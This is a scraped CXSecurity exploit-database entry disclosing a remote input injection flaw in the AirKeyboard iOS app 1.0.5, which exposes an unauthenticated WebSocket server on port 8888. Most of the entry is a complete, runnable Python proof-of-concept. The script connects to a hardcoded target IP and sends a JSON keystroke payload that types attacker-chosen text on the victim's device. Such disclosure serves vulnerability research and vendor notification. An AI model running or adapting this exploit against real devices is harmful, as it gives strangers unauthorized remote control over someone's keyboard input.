---
title: AirKeyboard iOS App 1.0.5 Remote Input Injection
url: https://cxsecurity.com/issue/WLB-2025060015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-06-16
fetch_date: 2025-10-06T22:52:09.804418
---

# AirKeyboard iOS App 1.0.5 Remote Input Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **AirKeyboard iOS App 1.0.5 Remote Input Injection** **2025.06.15**  Credit:  **[Chokri Hammedi](https://cxsecurity.com/author/Chokri%2BHammedi/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: AirKeyboard iOS App 1.0.5 - Remote Input Injection
# Date: 2025-06-13
# Exploit Author: Chokri Hammedi
# Vendor Homepage: https://airkeyboardapp.com
# Software Link: https://apps.apple.com/us/app/air-keyboard/id6463187929
# Version: Version 1.0.5
# Tested on: iOS 18.5 with AirKeyboard app
'''
Description:
The AirKeyboard iOS application exposes a WebSocket server on port 8888
which accepts arbitrary input injection messages from any client.
No authentication or pairing process is required. This allows any
attacker to type arbitrary keystrokes directly into the victim’s iOS device
in real-time without user interaction, resulting in full remote input
control.
'''
import websocket
import json
import time
target\_ip = "192.168.8.101"
ws\_url = f"ws://{target\_ip}:8888"
text = "i'm hacker i can write on your keyboard :)"
keystroke\_payload = {
"type": 1,
"text": f"{text}",
"mode": 0,
"shiftKey": True,
"selectionStart": 1,
"selectionEnd": 1
}
def send\_payload(ws):
print("[+] Sending remote keystroke...")
ws.send(json.dumps(keystroke\_payload))
time.sleep(1)
ws.close()
def on\_open(ws):
send\_payload(ws)
def on\_error(ws, error):
print(f"[!] Error: {error}")
def on\_close(ws, close\_status\_code, close\_msg):
print("[\*] Connection closed")
def exploit():
print(f"[+] Connecting to AirKeyboard WebSocket on {target\_ip}:8888")
ws = websocket.WebSocketApp(ws\_url,
on\_open=on\_open,
on\_error=on\_error,
on\_close=on\_close)
ws.run\_forever()
if \_\_name\_\_ == "\_\_main\_\_":
exploit()

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025060015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top